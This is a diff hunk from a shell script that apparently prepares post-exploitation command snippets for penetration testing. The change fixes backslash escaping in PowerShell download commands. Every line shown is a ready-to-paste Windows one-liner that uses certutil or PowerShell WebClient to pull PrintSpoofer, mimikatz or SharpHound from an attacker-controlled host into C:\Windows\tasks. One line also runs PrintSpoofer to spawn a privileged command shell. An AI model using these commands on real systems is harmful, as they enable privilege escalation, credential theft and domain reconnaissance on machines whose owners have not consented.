@@ -125,9 +125,9 @@ echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}
 echo "cd C:\Windows\\tasks && certutil -urlcache -f http://${IP}/tools/PrintSpoofer64.exe print.exe && print.exe -i -c cmd" > http/commands/printspoofer
 echo "cd C:\Windows\\tasks && certutil -urlcache -f http://${IP}/tools/mimikatz.exe mimi.exe" > http/commands/mimikatz
 echo "cd C:\Windows\\tasks && certutil -urlcache -f http://${IP}/SharpHound.exe sharphound.exe" > http/commands/sharphound
-echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/PrintSpoofer64.exe','c:\windows\\tasks\print.exe')" > http/commands/psprintspooler
-echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/mimi/mimikatz.exe','c:\windows\\tasks\mimi.exe')" > http/commands/psmimikatz
-echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/SharpHound.exe','c:\windows\\tasks\sharphound.exe')" > http/commands/pssharphound
+echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/PrintSpoofer64.exe','c:\windows\\\tasks\print.exe')" > http/commands/psprintspooler
+echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/mimi/mimikatz.exe','c:\windows\\\tasks\mimi.exe')" > http/commands/psmimikatz
+echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}/tools/SharpHound.exe','c:\windows\\\tasks\sharphound.exe')" > http/commands/pssharphound
 
 
 
